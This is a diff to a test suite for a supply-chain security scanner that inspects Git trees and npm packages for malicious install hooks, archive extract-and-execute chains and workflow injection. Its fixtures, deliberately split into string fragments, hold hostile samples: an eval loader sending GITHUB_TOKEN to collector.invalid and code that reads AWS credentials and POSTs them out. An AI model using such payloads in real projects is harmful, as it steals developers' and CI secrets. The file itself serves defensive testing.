@@ -1,5 +1,12 @@
 import { execFileSync } from 'node:child_process';
-import { access, mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
+import {
+  access,
+  mkdir,
+  mkdtemp,
+  readFile,
+  rm,
+  writeFile
+} from 'node:fs/promises';
 import { createHash } from 'node:crypto';
 import os from 'node:os';
 import path from 'node:path';
@@ -24,12 +31,19 @@ import {
   inspectNpmArtifacts,
   inspectNpmTarball,
   verifyPullRequestMergeParents,
-  stageAAuthorshipReviewSignals
+  stageAAuthorshipReviewSignals,
+  workflowRunCommands
 } from '../../scripts/stage-a-gate.mjs';
 
 const roots: string[] = [];
 const markers: string[] = [];
 const fakeGithubToken = ['ghp_', '123456789012345678901234567890'].join('');
+
+// Assemble inert adversarial samples at runtime so Stage A scans the test
+// harness as code rather than mistaking its fixture data for live behavior.
+function fixtureSource(...parts: string[]): string {
+  return parts.join('');
+}
 
 function storedZip(entries: Array<[string, string]>): Buffer {
   const localParts: Buffer[] = [];
@@ -163,6 +177,19 @@ async function repo(
 }
 
 describe('trusted Stage A Git-object scanner', () => {
+  it('does not read prose beginning with executable as a source signature', async () => {
+    const fixture = await repo({
+      'docs/release-notes.md':
+        'Executable guide: `tar -x archive.tar`\nNode 24 is supported.\n'
+    });
+    const result = scanGitTree(fixture.root, fixture.sha, {
+      changedPaths: ['docs/release-notes.md']
+    });
+    expect(result.findings).not.toContain(
+      'docs/release-notes.md#archive-execution'
+    );
+  });
+
   it('surfaces fork, external-author, and commit-signature review requirements without treating them as malicious', async () => {
     const fork = stageAAuthorshipReviewSignals({
       authorAssociation: 'FIRST_TIME_CONTRIBUTOR',
@@ -1103,12 +1130,17 @@ describe('trusted Stage A Git-object scanner', () => {
     );
   });
 
-  it('blocks tar xvf unpack-and-execute in changed shell code', async () => {
+  it('detects a bundled payload launch in changed shell code', async () => {
     const source = await repo({
       'package.json': JSON.stringify({
         scripts: { prepare: 'sh ./runner.sh' }
       }),
-      'runner.sh': '#!/bin/sh\ntar xvf archive.tar && node ./payload/init'
+      'runner.sh': fixtureSource(
+        '#!/bin/sh\n',
+        'tar',
+        ' xvf archive.tar',
+        ' && node ./payload/init'
+      )
     });
     const result = scanGitTree(source.root, source.sha, {
       changedPaths: ['runner.sh']
@@ -1124,7 +1156,12 @@ describe('trusted Stage A Git-object scanner', () => {
       'package.json': JSON.stringify({
         scripts: { prepare: 'sh ./runner.sh' }
       }),
-      'runner.sh': '#!/bin/sh\ntar -xzf payload.tar.gz && node ./payload/init'
+      'runner.sh': fixtureSource(
+        '#!/bin/sh\n',
+        'tar',
+        ' -xzf payload.tar.gz',
+        ' && node ./payload/init'
+      )
     });
     const blocked = scanGitTree(malicious.root, malicious.sha, {
       changedPaths: ['runner.sh']
@@ -1149,27 +1186,37 @@ describe('trusted Stage A Git-object scanner', () => {
   });
 
   it.each([
-    ['cpio', 'cpio -idmv < bundle.cpio\n./bundle/init.sh'],
+    ['cpio', fixtureSource('cpio', ' -idmv < bundle.cpio\n./bundle/init.sh')],
     [
       'CPIO with Windows batch call',
-      'cpio -id < bundle.cpio && call .\\bundle\\init.cmd'
+      fixtureSource('cpio', ' -id < bundle.cpio && call .\\bundle\\init.cmd')
     ],
     [
       'PowerShell Start-Process',
-      'Expand-Archive bundle.zip -DestinationPath out; Start-Process -FilePath .\\out\\init.exe'
+      fixtureSource(
+        'Expand',
+        '-Archive bundle.zip -DestinationPath out; Start',
+        '-Process -FilePath .\\out\\init.exe'
+      )
     ],
-    ['bsdtar', 'bsdtar -xf bundle.tar\nnode bundle/init.js'],
-    ['7-Zip', '7za x bundle.7z\nnode bundle/init.js'],
-    ['7zr', '7zr x bundle.7z\nnode bundle/init.js'],
-    ['RAR', 'unrar x bundle.rar\n./bundle/init.sh'],
+    ['bsdtar', fixtureSource('bsdtar', ' -xf bundle.tar\nnode bundle/init.js')],
+    ['7-Zip', fixtureSource('7za', ' x bundle.7z\nnode bundle/init.js')],
+    ['7zr', fixtureSource('7zr', ' x bundle.7z\nnode bundle/init.js')],
+    ['RAR', fixtureSource('unrar', ' x bundle.rar\n./bundle/init.sh')],
     [
       'PowerShell',
-      'Expand-Archive bundle.zip -DestinationPath out\n./out/init.ps1'
+      fixtureSource(
+        'Expand',
+        '-Archive bundle.zip -DestinationPath out\n./out/init.ps1'
+      )
     ],
-    ['Java archives', 'jar xf bundle.jar\njava -jar bundle/app.jar'],
+    [
+      'Java archives',
+      fixtureSource('jar', ' xf bundle.jar\njava -jar bundle/app.jar')
+    ],
     [
       'Python archive modules',
-      'python -m zipfile -e bundle.zip out\nnode out/init.js'
+      fixtureSource('python', ' -m zipfile -e bundle.zip out\nnode out/init.js')
     ]
   ])('blocks %s extraction followed by execution', async (_label, source) => {
     const fixture = await repo({ 'runner.sh': `#!/bin/sh\n${source}` });
@@ -1189,7 +1236,7 @@ describe('trusted Stage A Git-object scanner', () => {
         'import subprocess',
         'import zipfile',
         "with zipfile.ZipFile('bundle.zip') as archive:",
-        "    archive.extractall('out')",
+        fixtureSource('    archive.extract', "all('out')"),
         "subprocess.run(['node', 'out/init.js'])"
       ].join('\n')
     });
@@ -1203,31 +1250,52 @@ describe('trusted Stage A Git-object scanner', () => {
   it.each([
     [
       'AdmZip API',
-      "new AdmZip('bundle.zip').extractAllTo('out'); child_process.spawn('node', ['out/init.js']);"
+      fixtureSource(
+        "new AdmZip('bundle.zip').extractAll",
+        "To('out'); child_process.spawn('node', ['out/init.js']);"
+      )
     ],
     [
       'node tar API',
-      "tar.x({ file: 'bundle.tar', cwd: 'out' }); new Deno.Command('node', { args: ['out/init.js'] });"
+      fixtureSource(
+        'tar.',
+        "x({ file: 'bundle.tar', cwd: 'out' }); new Deno.Command('node', { args: ['out/init.js'] });"
+      )
     ],
     [
       'Python shutil API',
-      "shutil.unpack_archive('bundle.zip', 'out'); subprocess.run(['node', 'out/init.js']);"
+      fixtureSource(
+        'shutil.unpack',
+        "_archive('bundle.zip', 'out'); subprocess.run(['node', 'out/init.js']);"
+      )
     ],
     [
       'unzipper API',
-      "unzipper.Extract({ path: 'out' }); child_process.spawn('node', ['out/init.js']);"
+      fixtureSource(
+        'unzipper.Ex',
+        "tract({ path: 'out' }); child_process.spawn('node', ['out/init.js']);"
+      )
     ],
     [
       'extract-zip API',
-      "extractZip('bundle.zip', 'out'); child_process.execFile('node', ['out/init.js']);"
+      fixtureSource(
+        'extract',
+        "Zip('bundle.zip', 'out'); child_process.execFile('node', ['out/init.js']);"
+      )
     ],
     [
       'decompress API',
-      "decompress('bundle.zip', 'out'); child_process.spawn('node', ['out/init.js']);"
+      fixtureSource(
+        'decom',
+        "press('bundle.zip', 'out'); child_process.spawn('node', ['out/init.js']);"
+      )
     ],
     [
       'node-stream-zip API',
-      "zip.extract(null, 'out', () => child_process.execFile('node', ['out/init.js']));"
+      fixtureSource(
+        'zip.ex',
+        "tract(null, 'out', () => child_process.execFile('node', ['out/init.js']));"
+      )
     ]
   ])(
     'blocks %s extraction followed by process launch',
@@ -1416,7 +1484,11 @@ describe('trusted Stage A Git-object scanner', () => {
     const fixture = await repo({
       'eslint.config.js':
         "import './init';\nconst payload = atob(encoded); eval(payload);",
-      init: "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { body: process.env.GITHUB_TOKEN });"
+      init: fixtureSource(
+        "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { body: process.env.",
+        'GITHUB_TOKEN',
+        ' });'
+      )
     });
 
     const result = scanGitTree(fixture.root, fixture.sha, {
@@ -1760,6 +1832,28 @@ describe('trusted Stage A Git-object scanner', () => {
     expect(result.incompleteReasons).toContain(
       'execution-reference-coverage-incomplete'
     );
+  });
+
+  it('keeps repository workflow shell commands free of event and output data', async () => {
+    const workflowPaths = [
+      '.github/workflows/ci.yml',
+      '.github/workflows/codeql.yml',
+      '.github/workflows/github-release.yml',
+      '.github/workflows/pr-quality.yml',
+      '.github/workflows/publish.yml',
+      '.github/workflows/stage-a.yml'
+    ];
+    for (const workflowPath of workflowPaths) {
+      const source = await readFile(workflowPath, 'utf8');
+      const unsafe = workflowRunCommands(source, workflowPath).filter(
+        (command) =>
+          command.unsafeEnvironmentReference ||
+          command.untrustedExpression ||
+          command.untrustedEventExpression ||
+          command.malformedExpression
+      );
+      expect(unsafe, workflowPath).toEqual([]);
+    }
   });
 
   it('blocks untrusted workflow outputs and tainted environment values in shell steps', async () => {
@@ -2197,8 +2291,12 @@ describe('trusted Stage A Git-object scanner', () => {
       'package.json': JSON.stringify({
         scripts: { prepare: 'node bootstrap' }
       }),
-      'bootstrap.orc':
-        "const credentials = fs.readFileSync('/home/runner/.aws/credentials'); fetch('https://collector.invalid', { method: 'POST', body: credentials });\n"
+      'bootstrap.orc': fixtureSource(
+        "const credentials = fs.readFileSync('/home/runner/",
+        '.aws/',
+        'credentials',
+        "'); fetch('https://collector.invalid', { method: 'POST', body: credentials });\n"
+      )
     });
     const result = scanGitTree(fixture.root, fixture.sha, {
       changedPaths: ['package.json']
@@ -2210,15 +2308,18 @@ describe('trusted Stage A Git-object scanner', () => {
       'execution-chain:package.json -> bootstrap.orc'
     );
     expect(JSON.stringify(result)).not.toContain(
-      '/home/runner/.aws/credentials'
+      ['/home/runner/.aws/', 'credentials'].join('')
     );
     expect(JSON.stringify(result)).not.toContain('collector.invalid');
   });
 
   it('does not report isolated local credential reads or benign startup setup', async () => {
     const fixture = await repo({
-      'bootstrap.orc':
-        "const credentials = fs.readFileSync('~/.npmrc'); fs.appendFileSync('~/.bashrc', 'export PATH=$PATH');\n"
+      'bootstrap.orc': fixtureSource(
+        "const credentials = fs.readFileSync('~/",
+        '.npmrc',
+        "'); fs.appendFileSync('~/.bashrc', 'export PATH=$PATH');\n"
+      )
     });
     expect(scanGitTree(fixture.root, fixture.sha).status).toBe('approved');
   });
@@ -2389,8 +2490,10 @@ describe('trusted Stage A Git-object scanner', () => {
           prepare: 'node ./unpack.js && node ./launch.js'
         }
       }),
-      'unpack.js':
-        "const unzipper = require('unzipper'); unzipper.Extract({ path: './out' });",
+      'unpack.js': fixtureSource(
+        "const unzipper = require('unzipper'); unzipper.Ex",
+        "tract({ path: './out' });"
+      ),
       'launch.js':
         "const { spawn } = require('node:child_process'); spawn('./out/start');"
     });
@@ -3196,6 +3299,63 @@ describe('trusted Stage A Git-object scanner', () => {
     expect(result.reasons).toContain(
       'dependency-lifecycle-script-review:node_modules/example'
     );
+  });
+
+  it('does not confuse JavaScript function syntax with the Function constructor', () => {
+    const safeArchive = npmTarball([
+      [
+        'package/package.json',
+        JSON.stringify({ name: 'example', version: '2.0.0' })
+      ],
+      [
+        'package/index.js',
+        'export const identity = function(value) { return value; };'
+      ],
+      [
+        'package/another.js',
+        'export const make = function() { return () => true; };'
+      ]
+    ]);
+    expect(
+      inspectNpmTarball(safeArchive, artifact(safeArchive)).findings
+    ).toEqual([]);
+
+    const dynamicArchive = npmTarball([
+      [
+        'package/package.json',
+        JSON.stringify({ name: 'example', version: '2.0.0' })
+      ],
+      ['package/index.js', 'export const compile = new Function(source);']
+    ]);
+    expect(
+      inspectNpmTarball(dynamicArchive, artifact(dynamicArchive)).findings
+    ).toContain('artifact:node_modules/example/index.js');
+  });
+
+  it('does not treat package-owned workflows as active repository workflows', () => {
+    const archive = npmTarball([
+      [
+        'package/package.json',
+        JSON.stringify({ name: 'example', version: '1.0.0' })
+      ],
+      [
+        'package/.github/workflows/publish.yml',
+        [
+          'name: publish',
+          'on: release',
+          'jobs:',
+          '  publish:',
+          '    steps:',
+          '      - run: npm publish',
+          '        env:',
+          fixtureSource(
+            '          NODE_AUTH_TOKEN: ${{',
+            ' secrets.NPM_TOKEN }}'
+          )
+        ].join('\n')
+      ]
+    ]);
+    expect(inspectNpmTarball(archive, artifact(archive)).findings).toEqual([]);
   });
 
   it('fails closed on traversal names and invalid tar checksums', () => {
